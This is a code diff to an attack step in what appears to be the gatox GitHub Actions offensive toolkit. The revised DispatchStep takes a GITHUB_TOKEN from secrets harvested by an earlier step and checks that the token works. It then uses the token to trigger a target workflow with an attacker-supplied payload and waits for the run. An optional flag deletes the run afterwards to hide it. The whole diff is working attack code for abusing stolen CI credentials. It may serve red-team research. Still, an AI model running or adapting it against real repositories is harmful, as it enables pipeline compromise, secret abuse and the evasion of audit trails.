@@ -2,6 +2,7 @@ from gatox.attack.pwnrequest.steps.attack_step import AttackStep
 from gatox.github.api import Api
 
 from gatox.cli.output import Output
+from gatox.attack.utilities import AttackUtilities
 
 
 class DispatchStep(AttackStep):
@@ -10,41 +11,106 @@ class DispatchStep(AttackStep):
     """
 
     def __init__(
-        self, credential, target_workflow: str, payload: dict, target_branch: str = None
+        self,
+        target_repository,
+        target_workflow: str,
+        payload: dict,
+        target_branch: str = None,
+        delete_run: bool = False,
     ):
-        """ """
-        self.credential = credential
+        """Initialize the step with the target repository, branch, workflow, and payload."""
+        self.target_repo = target_repository
+        self.step_data = (
+            f"Dispatch - Target Workflow: {target_branch}:{target_workflow}"
+        )
         self.target_workflow = target_workflow
         self.target_branch = target_branch
         self.payload = payload
+        self.delete_run = delete_run
 
-    def preflight(self, api: Api):
+    def setup(self, api):
+        """Checks and setup."""
+        branch_resp = api.call_get(
+            f"/repos/{self.target_repo}/branches/{self.target_branch}"
+        )
+        if branch_resp.status_code != 200:
+            Output.error(f"Branch {self.target_branch} not found in {self.target_repo}")
+            return False
+
+        workflow_status = api.call_get(
+            f"/repos/{self.target_repo}/actions/workflows/{self.target_workflow}"
+        )
+        if workflow_status.status_code != 200:
+            Output.error(
+                f"Workflow {self.target_workflow} not found in {self.target_repo}"
+            )
+            return False
+        else:
+            workflow_status = workflow_status.json()
+            if workflow_status["state"] == "disabled":
+                Output.error(
+                    f"Workflow {self.target_workflow} is not enabled in {self.target_repo}"
+                )
+                return False
+
+        return True
+
+    def preflight(self, api, previous_results=None):
         """Validates preconditions for executing this step."""
 
-        # Check if branch exists
-        branch_status = api.get_branch(self.target_branch)
-        # Check if workflow exists on that branch
-        workflow_status = api.get_workflow(self.target_workflow, self.target_branch)
-        # Check if the workflow is enabled
+        self.credential = previous_results["secrets"]["values"]["system.github.token"]
+
+        status = api.call_get(
+            f"/installation/repositories", credential_override=self.credential
+        )
+        if status.status_code == 401:
+            Output.error("Token invalid or expired!")
+            return False
+
+        Output.owned(f"Token is valid!")
+        # We need to pass the secrets on.
+        self.output["secrets"] = previous_results["secrets"]
 
         return True
 
     def execute(self, api):
         """Execute the step after validating pre-conditions."""
-
-        api.override_credential(self.credential)
-
         status = api.dispatch_workflow(
-            self.target_workflow, self.target_branch, self.payload
+            self.target_workflow,
+            self.target_branch,
+            self.payload,
+            credential_override=self.credential,
         )
 
-        if status:
-            Output.info(
-                f"Dispatched {self.target_workflow} on {self.target_branch} successfully."
+        if status.status_code != 204:
+            Output.error(
+                f"Failed to dispatch {self.target_workflow} on {self.target_branch}, does the token have actions: write?"
             )
 
-        api.reset_credential()
+            return False
+        else:
+            Output.info(
+                f"Successfully dispatched {self.target_workflow} on {self.target_branch}!"
+            )
 
-    def handoff(self):
-        """ """
-        pass
+            curr_time = AttackUtilities.get_current_time()
+            workflow_id = api.get_recent_workflow(
+                self.target_repo,
+                # resp.json()[0]["sha"],
+                self.target_workflow,
+                time_after=f">{curr_time}",
+            )
+
+            # Now wait for the workflow to complete
+            status = api.wait_for_workflow(
+                self.target_repo,
+                self.target_workflow,
+                self.target_branch,
+                credential_override=self.credential,
+            )
+
+            if self.delete_run:
+                status = api.call_delete(
+                    f"/repos/{self.target_repo}/actions/runs/{status.json()['id']}",
+                    credential_override=self.credential,
+                )
